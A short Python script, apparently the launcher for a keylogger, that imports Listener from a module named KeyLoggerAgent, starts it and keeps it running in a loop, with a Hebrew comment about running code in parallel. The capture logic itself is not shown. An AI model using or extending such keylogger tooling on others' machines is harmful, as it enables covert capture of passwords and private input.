from KeyLoggerAgent import Listener
import time

Listener.start()
while Listener.running:
    # להריץ קוד במקביל אם צריך
    time.sleep(0.01)




